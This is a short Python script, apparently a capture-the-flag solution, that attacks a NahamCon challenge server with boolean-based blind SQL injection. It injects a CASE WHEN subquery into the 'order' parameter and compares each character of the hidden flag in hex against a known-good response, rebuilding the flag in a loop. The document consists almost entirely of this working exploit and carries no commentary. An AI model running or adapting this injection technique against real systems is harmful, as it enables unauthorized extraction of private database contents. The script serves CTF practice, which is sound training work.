import requests

charlist = "abcdefghijklmnopqrstuvwxyz1234567890_{}"


url = "http://challenge.nahamcon.com:31467/"

flag = ''

correct = requests.post("http://challenge.nahamcon.com:31467/", data={"search":"Li","order":"(CASE WHEN (SELECT HEX(SUBSTR(flag, 2, 1)) FROM flag)=\"6C\" THEN atomic_number ELSE name END)"}).text.split("\n")[69:80]
#BAD = requests.post("http://challenge.nahamcon.com:31467/", data={"search":"Li","order":"(CASE WHEN (SELECT HEX(SUBSTR(flag, 2, 1)) FROM flag)=\"8\" THEN atomic_number ELSE name END)"}).text.split("\n")[69:80]

for i in range(1, 40):
	for c in charlist:
		body = {"search":"Li","order":"(CASE WHEN (SELECT HEX(SUBSTR(flag,"+str(i)+", 1)) FROM flag)=\""+hex(ord(c))[2:].upper()+"\" THEN atomic_number ELSE name END)"}
		r = requests.post(url, data = body).text.split("\n")[69:80]

		if r == correct:
			flag += c
			print(flag)
			break

